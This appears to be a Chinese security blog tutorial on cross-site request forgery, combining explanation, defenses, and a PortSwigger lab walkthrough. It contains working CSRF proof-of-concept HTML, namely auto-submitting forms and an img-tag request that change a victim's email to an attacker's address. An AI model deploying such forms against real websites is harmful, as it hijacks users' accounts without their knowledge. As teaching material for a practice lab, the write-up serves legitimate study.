@@ -1,0 +1,262 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Web_CSRF - Charmersix</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="比较简单的洞，其实在CTFshow平台上，这部分题目直接放在xss了，当然这部分和XSS也非常相似，都是利用了HTML和JS
+CSRF是什么跨站请求伪造，允许攻击者诱导用户执行他们不愿意执行的操作。,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Charmersix" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="Web_CSRF - Charmersix"/>
+    <meta name="twitter:description" content="比较简单的洞，其实在CTFshow平台上，这部分题目直接放在xss了，当然这部分和XSS也非常相似，都是利用了HTML和JS
+CSRF是什么跨站请求伪造，允许攻击者诱导用户执行他们不愿意执行的操作。,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="Charmersix"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="Web_CSRF - Charmersix"/>
+    <meta property="og:description" content="比较简单的洞，其实在CTFshow平台上，这部分题目直接放在xss了，当然这部分和XSS也非常相似，都是利用了HTML和JS
+CSRF是什么跨站请求伪造，允许攻击者诱导用户执行他们不愿意执行的操作。,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Charmersix</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://charmersix.icu"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">Web_CSRF</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">Web_CSRF</h1>
+        <div class="stuff">
+            <span>八月 26, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>比较简单的洞，其实在CTFshow平台上，这部分题目直接放在xss了，当然这部分和XSS也非常相似，都是利用了HTML和JS</p>
+<h3 id="CSRF是什么"><a href="#CSRF是什么" class="headerlink" title="CSRF是什么"></a>CSRF是什么</h3><p>跨站请求伪造，允许攻击者诱导用户执行他们不愿意执行的操作。允许攻击者部分规避同源策略，该策略旨在防止不同网站之间相互干扰。</p>
+<p>简言之，冒充用户，做一些恶意请求，伪装用户进行恶意操作。</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208252202546.svg"></p>
+<h3 id="CSRF攻击的影响"><a href="#CSRF攻击的影响" class="headerlink" title="CSRF攻击的影响"></a>CSRF攻击的影响</h3><p>在成功的CSRF攻击中，攻击者会导致受害者用户无意执行某项操作。例如，改受害用户的电子邮箱地址、改受害用户的头像、个性签名，甚至是可以修改他的密码进行资金转账。像CTFshow_XSS后边几个题就是如此。如果受害用户是admin，那么能进行的操作可能更多。</p>
+<h3 id="CSRF如何工作"><a href="#CSRF如何工作" class="headerlink" title="CSRF如何工作"></a>CSRF如何工作</h3><p>CSRF要想存在，必须具备三个关键条件，所以说这种洞也是很少。</p>
+<p>１、网站中存在用户可登录的地方，如果就是个纯静态的网站，连用户登录点都没有，那一切都是空谈。</p>
+<p>２、执行该操作时涉及发出一个或者多个HTTP请求，并且网站仅依赖cookie来识别发出请求的用户。没有其他机制可用于追踪会话或验证用户请求。而且这个cookie必须要能利用到其他站点，因为我们要跨站，如果cookie不能跟走，那也是没什么用的，比如说<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ba6500990694">httponly</a>和<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie/SameSite">SameSite</a>都会阻碍我们的CSRF和XSS</p>
+<p>３、执行CSRF操作的请求不包含攻击者无法确定或猜测其值的任何参数。例如，当导致用户更改密码时，需要知道现有的密码，那么自然是无法实现。</p>
+<p>例如，假设一个网站包含一个允许用户更改自己账户上的电子邮箱地址的功能。用户执行此操作时候。会发出如下HTTP请求：</p>
+<blockquote>
+<p>POST /email/change HTTP/1.1<br>Host: vulnerable-website.com<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 30<br>Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE</p>
+<p>email=<a href="mailto:&#x63;&#x68;&#x61;&#x72;&#109;&#x65;&#x72;&#115;&#105;&#120;&#x40;&#103;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#x63;&#111;&#109;">&#x63;&#x68;&#x61;&#x72;&#109;&#x65;&#x72;&#115;&#105;&#120;&#x40;&#103;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#x63;&#111;&#109;</a></p>
+</blockquote>
+<p>这个例子就符合上述三个条件，</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 该网站存在登陆点，至少可以用Email登录</li>
+<li><input checked="" disabled="" type="checkbox"> 就这一个Cookie牵连着</li>
+<li><input checked="" disabled="" type="checkbox"> 没有其他因素影响攻击者</li>
+</ul>
+<p>那么就可以开始攻击他了，构建一个HTML网页，like this</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://vulnerable-website.com/email/change&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;pwned@evil-user.net&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>那么你一定好奇，这些都要自己写吗，可不可以一键日卫星，当然可以。</p>
+<p>这个下面会结合靶场具体讲，这里只是举个小🌰而已</p>
+<p>那么这时候受害者访问攻击者的网页，他们在存在csrf漏洞的网站的邮箱就会改变成攻击者的邮箱</p>
+<p><code>pwned@evil-user.net</code></p>
+<blockquote>
+<p>小tips</p>
+<p>尽管csrf通常被描述为与基于cookie的会话处理相关，但它也出现在应用程序自动将一些用户凭据添加到请求的其他上下文中，例如http基本身份验证和基于证书的身份验证。</p>
+</blockquote>
+<h3 id="构建CSRF攻击"><a href="#构建CSRF攻击" class="headerlink" title="构建CSRF攻击"></a>构建CSRF攻击</h3><p>从上边🌰中能看出，我们自己去手动写CSRF漏洞利用的HTML可能会比较麻烦，特别是所需的请求包含大量参数或请求中有其他麻烦的情况下。构建CSRF一键日🛰的方法就是使用burp suite内置的CSRF PoC 生成器</p>
+<p>这边我们来一个简单的靶场，主要是说一下bp的使用。</p>
+<p>靶场我们选用的是burp官网的<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">靶场</a>csrf第二题</p>
+<p>我们抓包改邮箱看一下，会发现这里边绑定了cookie和一个token也就是内个CSRF=</p>
+<p>然后我们看一下这个cookie有什么规律，再改一下</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208262204091.png"></p>
+<p>经过测试，我们发现，把传输方式改成GET，token就没什么卵用了</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208262306987.png"></p>
+<p>就可以生成一个poc</p>
+<p>在这个选项里可以勾选自动提交</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208262307922.png"></p>
+<p>当然要自动提交了，再让受害者去点击提交，不是添麻烦嘛</p>
+<p>我们直接复制下来html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://0ae30021031005aac00448e6001b00b9.web-security-academy.net/my-account/change-email&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;charmersix@gmail.com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里我们要把邮箱改成攻击者的邮箱</p>
+<p>我们来到这个exploit server，把这坨HTML复制到框里</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208262313156.png"></p>
+<p>然后点击漏洞利用</p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208262314197.png"></p>
+<p>CSRF漏洞利用</p>
+<p>CSRF与XSS的原理基本相同。通常，攻击者会将恶意HTML放置到他们控制的网站上，然后诱导受害者访问该网站。这可以 通过电子邮件或社交媒体消息向用户提供网站链接来完成。或者如果攻击被放置在一个流行的网站中（例如，某用户评论区），他们就等着有用户访问恶意网站。</p>
+<p>请注意，一些简单的CSRF漏洞利用使用GET方式，并且可以在易受攻击的网站上使用单个URL完全自包含。这种情况下，攻击者可能不需要外部站点，并且可以直接向受害者提供易受攻击上的恶意URL．在前面的例子中，如果可以使用GET方法执行更改电子邮箱地址的请求，那么自包含攻击如下所示：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://vulnerable-website.com/email/change?email=pwned@evil-user.net&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="防止CSRF攻击"><a href="#防止CSRF攻击" class="headerlink" title="防止CSRF攻击"></a>防止CSRF攻击</h3><p>防御CSRF攻击的最可靠方法是在相关请求中包含CSRF　ｔｏｋｅｎ。</p>
+<p>并且token要满足下面三个条件：</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 对于一般的token，值是不可预测的。</li>
+<li><input checked="" disabled="" type="checkbox"> session绑定到用户</li>
+<li><input checked="" disabled="" type="checkbox"> 执行相关操作之前，token一直能经过验证</li>
+</ul>
+<p>最常见的防御就是samesite　cookie</p>
+<h3 id="常见的CSRF漏洞"><a href="#常见的CSRF漏洞" class="headerlink" title="常见的CSRF漏洞"></a>常见的CSRF漏洞</h3><p>CSRF一般出现在邮箱修改，转账修改</p>
+<p>最有趣的CSRF漏洞由于token验证错误引起。</p>
+<p>在前面的示例中，假设application现在在更改用户电子邮箱的请求中包含一个CSRFtoken：</p>
+<blockquote>
+<p>POST /email/change HTTP/1.1<br>Host: vulnerable-website.com<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 68<br>Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm</p>
+<p>csrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&amp;email=<a href="mailto:&#119;&#x69;&#101;&#x6e;&#x65;&#114;&#x40;&#110;&#111;&#114;&#109;&#97;&#x6c;&#x2d;&#x75;&#115;&#101;&#114;&#x2e;&#99;&#111;&#109;">&#119;&#x69;&#101;&#x6e;&#x65;&#114;&#x40;&#110;&#111;&#114;&#109;&#97;&#x6c;&#x2d;&#x75;&#115;&#101;&#114;&#x2e;&#99;&#111;&#109;</a></p>
+</blockquote>
+<p>这种看起来可以防御CSRF攻击，因为它不具备CSRF存在的条件：网站不仅仅依赖于cookie进行会话处理，并且请求包含一个攻击者无法确定其值的参数。然而，有多种方法可以打破防御，所以还是有被CSRF攻击的可能。</p>
+<p>还有很多具体的情况，ｂｐ靶场里也是有的。</p>
+<p>CSRF还是很简单的，原理也比较好理解，具体绕过始终也离不开cookie，token，请求头之类的。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="true"
+        data-ae="false"
+        data-ci="f71ceda7a670da0dc3de"
+        data-cs="8be3f3262b0ceccee081194200fa10dca1224f03"
+        data-r="blog_comments"
+        data-o="Charmersix"
+        data-a="Charmersix"
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.</span> <span class="toc-text">CSRF是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF%E6%94%BB%E5%87%BB%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="toc-number">2.</span> <span class="toc-text">CSRF攻击的影响</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C"><span class="toc-number">3.</span> <span class="toc-text">CSRF如何工作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E5%BB%BACSRF%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">构建CSRF攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%AD%A2CSRF%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">防止CSRF攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84CSRF%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">常见的CSRF漏洞</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
